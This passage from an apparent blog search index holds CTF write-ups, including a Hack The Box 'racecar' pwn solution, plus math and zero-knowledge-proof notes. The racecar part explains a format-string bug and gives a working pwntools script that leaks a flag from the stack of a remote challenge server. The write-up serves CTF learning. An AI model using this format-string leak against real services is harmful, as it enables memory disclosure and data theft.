♠ ♠ ♠ ♠ ♠ ♠ ♠ 第八题123456789101112131415◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉◉ HINT: Run &#x27;gdb ./main&#x27; to open the binary in the debugger, then ◉◉ run &#x27;p &lt;function_name&gt;&#x27; to see the address of a function. ◉◉ ◉◉ e.g. pwndbg&gt; p main ◉◉ $2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x401294 &lt;main&gt; ◉◉ ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉[*] Question number 0x8:What is the address of &#x27;under_construction()&#x27; in hex? (e.g. 0x401337)&gt;&gt; 123456└─$ gdb -q ./mainReading symbols from ./main...(No debugging symbols found in ./main)(gdb) p under_construction$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x4011d6 &lt;under_construction&gt; 1234567891011&gt;&gt; 0x4011d6♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠♠ ♠♠ Correct ♠♠ ♠♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠ ♠Great job! It&#x27;s high time you solved your first challenge! Here is the flag!HTB&#123;w4rm35t_w4rmup_3v3r&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB racecar Writeup","slug":"CTF/Pwn/HTB-racecar-Writeup","date":"2025-08-18T21:56:17.000Z","updated":"2025-08-18T22:20:54.710Z","comments":true,"path":"2025/08/18/CTF/Pwn/HTB-racecar-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/08/18/CTF/Pwn/HTB-racecar-Writeup/","excerpt":"利用格式化字符串漏洞读取信息。","text":"题目 代码审计用IDA反汇编出来的伪代码： 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+0h] [ebp-Ch] v5 = __readgsdword(0x14u); setup(); banner(); info(); while ( check ) &#123; v3 = menu(); if ( v3 == 1 ) &#123; car_info(); &#125; else if ( v3 == 2 ) &#123; check = 0; car_menu(); &#125; else &#123; printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); &#125; &#125; return __readgsdword(0x14u) ^ v5;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889unsigned int banner()&#123; time_t v0; // eax char *s1; // [esp+0h] [ebp-28h] char *s2; // [esp+4h] [ebp-24h] _DWORD v4[5]; // [esp+8h] [ebp-20h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); v4[0] = &quot;\\x1B[1;33m&quot;; v4[1] = &quot;\\x1B[1;36m&quot;; v4[2] = &quot;\\x1B[1;32m&quot;; v4[3] = &quot;\\x1B[1;31m&quot;; v4[4] = &quot;\\x1B[1;34m&quot;; v0 = time(0); srand(v0); s1 = (char *)v4[rand() % 5]; do s2 = (char *)v4[rand() % 5]; while ( !strcmp(s1, s2) ); puts(asc_1558); printf(&quot;%s ______ %s|xxx|\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s /|_||_\\\\`.__ %s| F |\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s ( _ _ _\\\\ %s|xxx|\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s*** =`-(_)--(_)-&#x27; %s| I |\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s| N |\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s| I |\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_- _/\\\\______\\\\__ %s| S |\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_-__ / ,-. -|- ,-.`-. %s|xxx|\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_- `( o )----( o )-&#x27; %s| H |\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s `-&#x27; `-&#x27; %s|xxx|\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); puts(byte_1888); return __readgsdword(0x14u) ^ v5;&#125;unsigned int info()&#123; void *buf; // [esp+4h] [ebp-14h] char *s; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); buf = malloc(0x20u); s = (char *)malloc(0x20u); printf(&quot;\\n%sInsert your data:\\n\\n&quot;, &quot;\\x1B[1;36m&quot;); printf(&quot;Name: &quot;); read(0, buf, 0x1Fu); *((_BYTE *)buf + strlen((const char *)buf) - 1) = 0; printf(&quot;Nickname: &quot;); read(0, s, 0x1Fu); s[strlen(s) - 1] = 0; printf( &quot;\\n%s[+] Welcome [%s%s%s]!\\n\\n%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;33m&quot;, buf, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;, &quot;\\x1B[1;33m&quot;, buf, &quot;\\x1B[1;36m&quot;, &quot;\\x1B[1;33m&quot;, s, &quot;\\x1B[1;36m&quot;); printf(&quot;\\n[*] Current coins: [%d]\\n&quot;, coins); return __readgsdword(0x14u) ^ v3;&#125;unsigned int car_info()&#123; unsigned int v1; // [esp+Ch] [ebp-Ch] v1 = __readgsdword(0x14u); puts(asc_1BB0); puts(aCar1Stats); printf(aSpeedS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;); printf(aAccelerationS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;); printf(aHandlingS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); puts(asc_1BB0); puts(aCar2Stats); printf(aSpeedS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); printf(aAccelerationS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); printf(aHandlingS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); puts(asc_1BB0); return __readgsdword(0x14u) ^ v1;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485int car_menu()&#123; time_t v0; // eax size_t i; // eax size_t v2; // edx int result; // eax int v4; // [esp+0h] [ebp-58h] int v5; // [esp+0h] [ebp-58h] int v6; // [esp+4h] [ebp-54h] int v7; // [esp+4h] [ebp-54h] unsigned int v8; // [esp+8h] [ebp-50h] int v9; // [esp+Ch] [ebp-4Ch] int v10; // [esp+10h] [ebp-48h] void *buf; // [esp+18h] [ebp-40h] FILE *stream; // [esp+1Ch] [ebp-3Ch] char v13[44]; // [esp+20h] [ebp-38h] BYREF unsigned int v14; // [esp+4Ch] [ebp-Ch] v14 = __readgsdword(0x14u); v4 = -1; v6 = -1; do &#123; printf(aSelectCar1); v9 = read_int(v4, v6); if ( v9 != 2 &amp;&amp; v9 != 1 ) printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); &#125; while ( v9 != 2 &amp;&amp; v9 != 1 ); v10 = race_type(); v0 = time(0); srand(v0); if ( v9 == 1 &amp;&amp; v10 == 2 || v9 == 2 &amp;&amp; v10 == 2 ) &#123; v5 = rand() % 10; v7 = rand() % 100; &#125; else if ( v9 == 1 &amp;&amp; v10 == 1 || v9 == 2 &amp;&amp; v10 == 1 ) &#123; v5 = rand() % 100; v7 = rand() % 10; &#125; else &#123; v5 = rand() % 100; v7 = rand() % 100; &#125; v8 = 0; for ( i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;); ; i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;) ) &#123; v2 = i; result = v8; if ( v2 &lt;= v8 ) break; putchar(aWaitingForTheR[v8]); if ( aWaitingForTheR[v8] == 46 ) sleep(0); ++v8; &#125; if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) ) &#123; printf(&quot;%s\\n\\n[+] You won the race!! You get 100 coins!\\n&quot;, &quot;\\x1B[1;32m&quot;); coins += 100; printf(&quot;[+] Current coins: [%d]%s\\n&quot;, coins, &quot;\\x1B[1;36m&quot;); printf(&quot;\\n[!] Do you have anything to say to the press after your big victory?\\n&gt; %s&quot;, &quot;\\x1B[0m&quot;); buf = malloc(0x171u); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !stream ) &#123; printf(&quot;%s[-] Could not open flag.txt. Please contact the creator.\\n&quot;, &quot;\\x1B[1;31m&quot;); exit(105); &#125; fgets(v13, 44, stream); read(0, buf, 0x170u); puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;); return printf((const char *)buf); &#125; else if ( v9 == 1 &amp;&amp; (result = v5, v5 &gt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &lt; v7) ) &#123; printf(&quot;%s\\n\\n[-] You lost the race and all your coins!\\n&quot;, &quot;\\x1B[1;31m&quot;); coins = 0; return printf(&quot;[+] Current coins: [%d]%s\\n&quot;, 0, &quot;\\x1B[1;36m&quot;); &#125; return result;&#125; 首先仔细阅读代码后会发现car_menu()函数中的格式化字符串漏洞： 123read(0, buf, 0x170u);puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);return printf((const char *)buf); 它会将我们输入的内容直接传递给printf函数。所以我们接下来需要做的就是2点： 如何触发这个漏洞，或者说如何进入这个if分支； 如何利用这个漏洞去读取信息，比如说flag的内容。 1. 如何进入这个if分支？ 不难发现，当车的类型选1，且比赛类型选2的时候，我们获胜的概率为 P( \\text{rand() mod } 10 < \\text{rand() mod }100 ) = 1-\\frac{1+\\cdots+10}{1000} = 94.5\\%非常高，或者说是获胜概率最高的选择。而获胜之后便可以输入获奖感言，这个时候便可以前面提到的漏洞。 2. 如何利用 注意到在这里： 12stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);fgets(v13, 44, stream); 程序将将flag读进栈上的v13[44]，所以我们可以直接利用%p读取stack上的内容，然后判断其中哪部分为flag的内容。 Exploit123456789101112131415161718192021222324252627282930313233343536373839from pwn import *import rer = remote(&quot;94.237.122.218&quot;, 33681)r.recvuntil(b&quot;Name:&quot;)r.sendline(b&quot;A&quot;)r.recvuntil(b&quot;Nickname:&quot;)r.sendline(b&quot;B&quot;)r.recvuntil(b&quot;2. Car selection&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;2&quot;)r.recvuntil(b&quot;Select car&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;1&quot;)r.recvuntil(b&quot;Select race&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;2&quot;)r.recvuntil(b&quot;victory?&quot;)# 假如没有收到则说明当前尝试没有成功，再重新跑一次脚本即可。payload = b&quot;%p &quot; * 40r.sendline(payload)data = r.recvall()hex_words = re.findall(rb&#x27;0x[0-9a-fA-F]&#123;1,8&#125;&#x27;, data)blob = bytearray()for hw in hex_words: blob += int(hw,16).to_bytes(4,&#x27;little&#x27;)start = blob.find(b&#x27;H&#x27;)end = blob.find(b&#x27;&#125;&#x27;, start)flag = blob[start:end+1].decode()print(flag)# HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"Stochastic Analysis 随机分析","slug":"TUM  数学 笔记/Stochastic Analysis 随机分析/Stochastic-Analysis-随机分析","date":"2025-07-17T17:56:32.000Z","updated":"2025-07-17T18:59:23.632Z","comments":true,"path":"2025/07/17/TUM  数学 笔记/Stochastic Analysis 随机分析/Stochastic-Analysis-随机分析/","permalink":"https://archer-baiyi.github.io/en/2025/07/17/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/Stochastic%20Analysis%20%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/","excerpt":"随机分析相关笔记","text":"Quadratic VariationDefinition: Let $E_n = \\{0 = t_1^{(n)} &lt; \\ldots &lt; t_{l_n}^{(n)}\\}$ be a sequence of partitions with $s(E_n) := \\sup |t_{i+1}^{(n)} - t_i^{(n)}| \\to 0$. Then, the continuous function $X_t$ has continuous quadratic variation along the sequence $E_n$ if\\langle X \\rangle_t = \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}} - X_{t_j} \\right)^2exists $P$-a.s. and is a continuous function of $t$. Remark: For any continuous function $X_t$, its quadratic variation $t \\mapsto \\langle X \\rangle_t$ is monotone increasing (non-decreasing). 其实不难发现，这个quadratic variation与普通的variance非常像，有很多类似的性质。 Lemma: Let $X$ be a continuous function, for $a,b \\in \\mathbb{R}$ we have\\langle aX+b \\rangle = a^2 \\langle X \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle aX+b \\rangle_t &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( aX_{t_{j+1}}+b - aX_{t_j} -b \\right)^2 \\\\ &= a^2\\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}} - X_{t_j} \\right)^2 \\\\ &= a^2 \\langle X \\rangle \\end{align*}$\\square$ Cross Variation在这章里，我们假设$X,Y$都是continuous function，并且拥有continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$. Definition: The cross-variation $\\langle X,Y \\rangle$ is defined as\\langle X,Y \\rangle_t = \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (X_{t_{j+1}} - X_{t_j})(Y_{t_{j+1}} - Y_{t_j})(if the limit exists). Clearly,\\langle X,X \\rangle = \\langle X \\rangle Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$, for $a,b,c,d \\in \\mathbb{R}$ we have\\langle aX+b,cY+d \\rangle = ac\\langle X,Y \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle aX+b,cY+d \\rangle_t &= \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (aX_{t_{j+1}}+b - aX_{t_j}-b)(cY_{t_{j+1}}+d - cY_{t_j}-d) \\\\ &= ac \\cdot \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (X_{t_{j+1}} - X_{t_j})(Y_{t_{j+1}} - Y_{t_j}) \\\\ &= ac\\langle X,Y \\rangle \\end{align*}$\\square$ Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$, we have \\langle X+Y,X+Y \\rangle = \\langle X \\rangle + 2\\langle X,Y \\rangle + \\langle Y \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle X+Y \\rangle_t &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}}+ Y_{t_{j+1}} - X_{t_j} - Y_{t_{j}}\\right)^2 \\\\ &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( (X_{t_{j+1}}- X_{t_j})+ (Y_{t_{j+1}} - Y_{t_{j}})\\right)^2\\\\ &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\Bigl(\\left( X_{t_{j+1}}- X_{t_j}\\right)^2 +2\\left( X_{t_{j+1}}- X_{t_j}\\right)\\left(Y_{t_{j+1}} - Y_{t_{j}}\\right) +\\left(Y_{t_{j+1}} - Y_{t_{j}}\\right)^2 \\Bigl) \\\\ &= \\langle X \\rangle + 2\\langle X,Y \\rangle + \\langle Y \\rangle \\end{align*}$\\square$ Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$ and $\\langle X \\rangle \\equiv 0$, then $\\langle X+Y \\rangle =0$.","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"Stochastic Analysis 随机分析","slug":"TUM-数学-笔记/Stochastic-Analysis-随机分析","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Stochastic Analysis","slug":"Stochastic-Analysis","permalink":"https://archer-baiyi.github.io/en/tags/Stochastic-Analysis/"},{"name":"随机分析","slug":"随机分析","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"}]},{"title":"如何部署CTFDd模板","slug":"CTF/General/如何部署CTFDd模板","date":"2025-07-10T10:50:55.000Z","updated":"2025-07-10T11:57:07.081Z","comments":true,"path":"2025/07/10/CTF/General/如何部署CTFDd模板/","permalink":"https://archer-baiyi.github.io/en/2025/07/10/CTF/General/%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2CTFDd%E6%A8%A1%E6%9D%BF/","excerpt":"部署CTFDd模板","text":"","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/en/categories/CTF/General/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://archer-baiyi.github.io/en/tags/ctf/"},{"name":"ctfd","slug":"ctfd","permalink":"https://archer-baiyi.github.io/en/tags/ctfd/"}]},{"title":"P-adic Numbers and Hensel's Lemma","slug":"TUM  数学 笔记/P-adic Numbers and Hensels Lemma/P-adic-Numbers-and-Hensel-s-Lemma","date":"2025-07-07T10:05:37.000Z","updated":"2025-07-07T10:07:01.196Z","comments":true,"path":"2025/07/07/TUM  数学 笔记/P-adic Numbers and Hensels Lemma/P-adic-Numbers-and-Hensel-s-Lemma/","permalink":"https://archer-baiyi.github.io/en/2025/07/07/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/P-adic%20Numbers%20and%20Hensels%20Lemma/P-adic-Numbers-and-Hensel-s-Lemma/","excerpt":"","text":"Introduction相信大家或多或少听过或者熟悉计算机里的（二进制）“补码”这个概念：比如说当我们用$(0001)_2$来表示$1$时，可以用$(1111)_2$ （$= (1111)_2 \\text{ xor } (0001)_2 + 1$）来表示$-1$。 而当我们将其转化成我们熟悉的十进制（$(1111)_2 = \\sum^{3}_{i=0}1\\cdot 2^n = 15$）的话，我们可以观察到下面这几个等式： \\begin{align*} -1 &\\equiv 15 \\quad \\text{ mod }2\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^2\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^3\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^4\\\\ \\end{align*}而这个4刚好是我们的binary code length。如果我们现在考虑一个无限长的code，那么该如果表达$-1$呢？很显然是$(\\cdots1111)_2$对吧，因为它满足 \\forall n \\in \\mathbb{N}_{>0} : -1 \\equiv \\sum^{\\infty}_{i=0}1\\cdot 2^n \\quad \\text{ mod }2^n\\\\P进数 P-adic Numbers受到Introduction里的例子的启发，我们做以下定义： Definition:Let $p$ be a prime number. A p-adic integer is a formal power seriesa_0+a_1p+a_2p^2+\\cdots = \\sum^\\infty_{i=0}a_ip^iwith $\\ a_i \\in \\{0,1,…,p-1\\}$ for all $i \\in \\mathbb{N}$. The set of all p-adic integers is written as $\\mathbb{Z}_p$.Furthermore, let $f = \\frac{g}{h} \\in \\mathbb{Z}_p$, the denominator of which is not divisible by $p$, then a p-adic integer $\\sum^\\infty_{i=0}a_i p^i \\in \\mathbb{Z}_p$ is called the \\textbf{p-adic expansion} of $f$ if\\forall n \\in \\mathbb{N}_{>0} : \\ \\ \\ \\ g \\equiv h(a_0+ \\cdots + a_{n-1}p^{n-1}) \\ \\ \\text{mod} \\ p^n,and we writef \\sim \\sum^\\infty_{i=0}a_i p^i. Definition:Let $p$ be a prime number, $m \\in \\mathbb{Z}$ an integer. A series of the form\\sum^\\infty_{i=m}a_i p^i,where $a_i \\in \\{0,…,p-1\\}$ for all $i$, is called a p-adic number and the set of all p-adic numbers is written as $\\mathbb{Q}_p$.Furthermore, let $f = p^{m}\\frac{g}{h} \\in \\mathbb{Q}$, a $p$-adic number $\\sum^\\infty_{i=m}a_i p^i \\in \\mathbb{Q}_p$ is called the \\textbf{p-adic expansion} of $f \\in \\mathbb{Q}$, if $\\sum^\\infty_{i=0}a_{i+m} p^i$ is the p-adic expansion of $\\frac{g}{h}$. Absolute values and completenessDefinition: Let $a=\\sum_{i=m}^\\infty a_ip^i \\in \\mathbb{Q}_p$. Then we define the p-adic absolute value as follows:|a|_p:= \\begin{cases} 0 & \\text{if} \\ a=0 , \\\\ \\frac{1}{p^n} &\\text{otherwise, where} \\ n=\\text{min} \\{i \\in \\mathbb{Z} | a_i \\neq 0\\}. \\end{cases} Hensel’s lemmaTheorem:Let $q \\in \\mathbb{R}_{&gt;1}$, $K$ be a field with a discrete valuation such that $K$ is complete with respect to the induced $q$-exponential absolute value. Let $\\mathcal{O}$ be its discrete valuation ring with the maximal ideal $\\mathfrak{p}$ and $\\kappa = \\mathcal{O}/\\mathfrak{p}$.If $f \\in \\mathcal{O} [X]$ is a primitive polynomial and there are coprime polynomials $\\bar{g}, \\bar{h} \\in \\kappa[X]$ such thatf \\equiv \\bar{g} \\cdot \\bar{h} \\ \\ \\ (\\text{mod} \\ \\mathfrak{p}),then there exist $g,h \\in \\mathcal{O}[X]$ with deg$(g) = \\text{deg}(\\bar{g})$ such thatf = g \\cdot h, \\ \\ \\ g \\equiv \\bar{g} \\ \\ (\\text{mod} \\ \\mathfrak{p}) \\ \\ \\text{and} \\ \\ h \\equiv \\bar{h} \\ \\ (\\text{mod} \\ \\mathfrak{p}).","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"P-adic Numbers and Hensels Lemma","slug":"TUM-数学-笔记/P-adic-Numbers-and-Hensels-Lemma","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/P-adic-Numbers-and-Hensels-Lemma/"}],"tags":[{"name":"p进数","slug":"p进数","permalink":"https://archer-baiyi.github.io/en/tags/p%E8%BF%9B%E6%95%B0/"},{"name":"P-adic Numbers","slug":"P-adic-Numbers","permalink":"https://archer-baiyi.github.io/en/tags/P-adic-Numbers/"},{"name":"Hensel's Lemma","slug":"Hensel-s-Lemma","permalink":"https://archer-baiyi.github.io/en/tags/Hensel-s-Lemma/"}]},{"title":"零知识证明 (Zero-knowledge proof)","slug":"CTF/Crypto/零知识证明-Zero-knowledge-proof","date":"2025-07-04T10:43:31.000Z","updated":"2025-07-04T11:34:23.882Z","comments":true,"path":"2025/07/04/CTF/Crypto/零知识证明-Zero-knowledge-proof/","permalink":"https://archer-baiyi.github.io/en/2025/07/04/CTF/Crypto/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E-Zero-knowledge-proof/","excerpt":"","text":"什么是零知识证明 (Zero-knowledge proof)A zero-knowledge proof (ZKP) is a technique that enables one party (the prover) to demonstrate to another party (the verifier) the truth of a certain statement without revealing any additional information besides the fact that the statement is true. The core idea behind zero-knowledge proofs is that while it’s straightforward to prove you have certain knowledge by disclosing it, the real challenge lies in proving you have that knowledge without actually revealing the knowledge itself or any details about it. 零知识证明（Zero-Knowledge Proof，简称ZKP）是一种技术，使一方（称为“证明者”）能够向另一方（称为“验证者”）证明某个陈述的真实性，同时不泄露除该陈述为真这一事实以外的任何其他信息。零知识证明的核心理念在于：尽管通过直接披露信息来证明自己拥有某种知识是较为直接的方式，但真正的挑战在于如何在不暴露该知识本身或其任何细节的前提下，仍能证明自己确实掌握了这项知识。 A ZK Protocol has 3 important attributes: Zero-Knowledge: this means that no information about the secret is revealed during the process. Completeness: meaning that an honest prover will always get accepted. Soundness: for this, we want that an impersonator has only a small cheating probability to get accepted. 一个零知识协议具有三个重要属性： 零知识性（Zero-Knowledge）：这意味着在整个过程中，不会泄露关于秘密的任何信息。 完备性（Completeness）：这表示如果证明者是诚实的，其证明将总是被验证者接受。 可靠性（Soundness）：指的是伪装者（冒充的证明者）被验证者接受的概率应该非常低。 例子：你需要向你的一位色盲朋友维克多证明，两只形状完全相同的球（一只是红色，另一只是绿色）是不同的，但又不能透露哪只是红的、哪只是绿的。为此，你采用了一种特定的证明系统。 你先向维克多展示这两只球。他由于无法分辨颜色，看不出它们的区别。接着他将球藏起来，随机选出一只给你看，然后可能会将它换成另一只，也可能不换，再次展示给你。你需要判断他是否交换了球。由于你能通过颜色分辨球的不同，你每次都能准确判断他是否更换了球。 这个过程重复足够多的次数（例如50次），而你每次都能正确识别是否换了球，这让维克多确信两只球确实不同，但他依然无法得知哪只是红色，哪只是绿色。这个证明过程没有泄露除“这两只球不同”之外的任何信息，因此，这是一个零知识证明的例子。 Feige–Fiat–Shamir identification schemeUriel Feige, Amos Fiat 以及 Adi Shamir 于1988年提出了一种基于二次剩余问题的零知识证明协议（ZK Protocol）。 整体流程主要分为2个阶段：生成密钥以及验证。 1. 生成密钥（Key generation）： Prover选择2个不同的质数$p,q$，一个正整数$k$，并且计算$n:= pq$。 挑选$k$个与$n$互质的数：$s_1,…,s_k$，并计算 v_i := s_i^{-2} \\quad \\text{ mod }n公钥（Verifier已知的信息）为$P = (n,v_1,…,v_k)$，密钥为$S= (p,q,s_1,…,s_k)$。 2. 验证（Verification）： (1) Prover随机挑选一个整数$c$以及一个符号$\\sigma \\in \\{-1,1\\}$，计算 x \\equiv \\sigma c^2 \\quad \\text{ mod }n并将这个结果$x$发送给Verifier。 (2) Verifier挑选一个challenge $b = (b_1,…,b_k) \\in \\{0,1\\}^k$，将其发送给prover。 (3) Prover计算 r \\equiv c \\prod_{j\\in [k] \\text{ s.t } b_j = 1} s_j \\quad \\text{ mod }n并将$r$发送给verifier。 (4) Verifier检查是否满足 x \\equiv \\pm \\, r^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} v_j \\quad \\text{ mod }n.那么这个Protocol为什么是有效的？不难发现： \\pm \\, r^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} v_j = \\pm \\, c^2 \\prod_{j\\in [k] \\text{ s.t } b_j = 1} s_j^2 v_j \\equiv \\pm \\, c^2 \\equiv x \\quad \\text{ mod }n.因为$s^2_j \\equiv v_j^{-1} \\text{ mod }n.$ 而这个Protocol的安全性是建立在求解二次剩余的困难性上，即找到以下等式的解： y ^2 \\equiv v^{-1}_j \\quad \\text{ mod }n.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"零知识证明","slug":"零知识证明","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"name":"Zero-knowledge 